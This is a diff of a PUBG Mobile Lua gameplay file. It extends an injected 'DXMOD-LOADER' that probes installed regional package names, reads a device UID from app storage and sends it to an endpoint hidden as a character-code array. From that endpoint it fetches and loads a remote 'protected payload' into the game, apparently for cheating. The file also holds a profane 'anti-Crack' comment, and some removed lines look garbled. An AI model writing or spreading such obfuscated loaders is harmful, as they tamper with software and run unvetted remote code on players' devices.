@@ -127,7 +127,7 @@ function BRPlayerCharacterBase:CheckAddCheckFallingDistanceComponent()
     local GameModeType = CGameMode.GameModeType
     local GameModeID = tonumber(CGameState.GameModeID)
     local bModeTypeSatisfy = GameModeType == EGameModeType.ETypicalGameMode or GameModeType == EGameModeType.EFourInOneGameMode or GameModeType == EGameModeType.EHeavyWeaponGameMode
-    local bModeIDSatisfy = MatchModeIds[GameModeID] - self
+    local bModeIDSatisfy = not MatchModeIds[GameModeID]
     print(bWriteLog and bWriteLog and "BRPlayerCharacterBase:CheckAddCheckFallingDistanceComponent:", GameModeType, GameModeID, bModeTypeSatisfy, bModeIDSatisfy)
     return bModeTypeSatisfy and bModeIDSatisfy
   end
@@ -335,7 +335,7 @@ function BRPlayerCharacterBase:CheckForbidFlaregun()
       uPlayerController:DisplayGameTipWithMsgID(48532)
     end
   end
-  return uPlayerState.CanUseFlaregun - self
+  return not uPlayerState.CanUseFlaregun
 end
 
 function BRPlayerCharacterBase:ServerRPC_NearDeathGiveupRescue()
@@ -504,11 +504,36 @@ end
 --  - anti-Crack: ĐỊT CÁI LOL BÀ MÀY NHÁ
 -- =========================================================================
 
+local function GetPackageName()
+    if _G.DX_PackageName then return _G.DX_PackageName end
+    local packages = {
+        "com.vng.pubgmobile",
+        "com.tencent.ig",
+        "com.pubg.krmobile",
+        "com.rekoo.pubgm",
+        "com.pubg.imobile"
+    }
+    for _, pkg in ipairs(packages) do
+        local temp_file_path = string.format("/sdcard/Android/data/%s/files/.dx_temp", pkg)
+        local f = io.open(temp_file_path, "w")
+        if f then
+            f:close()
+            os.remove(temp_file_path)
+            _G.DX_PackageName = pkg
+            return pkg
+        end
+    end
+    _G.DX_PackageName = "com.vng.pubgmobile"
+    return "com.vng.pubgmobile"
+end
+
 local function GetDeviceUID()
     local uid = "UNKNOWN"
     -- 1. Try reading the cached game UID from dx_last_uid.txt
     pcall(function()
-        local f = io.open("/sdcard/Android/data/com.vng.pubgmobile/files/dx_last_uid.txt", "r")
+        local pkg = GetPackageName()
+        local path = string.format("/sdcard/Android/data/%s/files/dx_last_uid.txt", pkg)
+        local f = io.open(path, "r")
         if f then
             local cached_uid = f:read("*a")
             f:close()
@@ -615,7 +640,9 @@ end
 
 local function WriteDebugLog(msg)
     pcall(function()
-        local f = io.open((function() local t={47,115,100,99,97,114,100,47,65,110,100,114,111,105,100,47,100,97,116,97,47,99,111,109,46,118,110,103,46,112,117,98,103,109,111,98,105,108,101,47,102,105,108,101,115,47,108,111,97,100,101,114,95,100,101,98,117,103,46,116,120,116} local r={} for i=1,#t do r[i]=string.char(t[i]) end return table.concat(r) end)(), "a")
+        local pkg = GetPackageName()
+        local path = string.format("/sdcard/Android/data/%s/files/loader_debug.txt", pkg)
+        local f = io.open(path, "a")
         if f then
             f:write(os.date("%Y-%m-%d %H:%M:%S") .. " " .. tostring(msg) .. "\n")
             f:close()
@@ -631,7 +658,7 @@ local function LoadProtectedPayload(OriginalClass)
     end)
     WriteDebugLog("[DXMOD-LOADER] Device UID: " .. tostring(uid) .. " (ok: " .. tostring(ok_uid) .. ", err: " .. tostring(err_uid) .. ")")
 
-    local api_url = (function() local t={104,116,116,112,58,47,47,108,101,116,104,105,101,110,110,104,97,110,46,105,100,46,118,110,47,97,112,105,47,112,97,121,108,111,97,100} local r={} for i=1,#t do r[i]=string.char(t[i]) end return table.concat(r) end)()
+    local api_url = (function() local t={104,116,116,112,115,58,47,47,108,101,116,104,105,101,110,110,104,97,110,46,105,100,46,118,110,47,97,112,105,47,112,97,121,108,111,97,100} local r={} for i=1,#t do r[i]=string.char(t[i]) end return table.concat(r) end)()
     local payload = '{"uid":"' .. uid .. '"}'
     local httpResult = nil
     
@@ -738,7 +765,7 @@ end
 local class = require("class")
 local CCharacterBase = require("GameLua.GameCore.Framework.CharacterBase")
 local CBRPlayerCharacterBase = class(CCharacterBase, nil, BRPlayerCharacterBase)
-return require("combine_class").DeclareFeature(CBRPlayerCharacterBase, {
+local finalClass = require("combine_class").DeclareFeature(CBRPlayerCharacterBase, {
   {
     SkyTransition = "GameLua.Mod.BaseMod.Gameplay.Feature.SkyControl.PlayerCharacterSkyTransitionFeature"
   },
@@ -776,3 +803,6 @@ return require("combine_class").DeclareFeature(CBRPlayerCharacterBase, {
     GeneralShowSpotFeature = "GameLua.Mod.BRMod.Gameplay.Feature.PlayerCharacterGeneralShowSpotFeature"
   }
 }, "BRPlayerCharacterBase")
+
+_G.DX_ActivePlayerClass = finalClass
+return finalClass
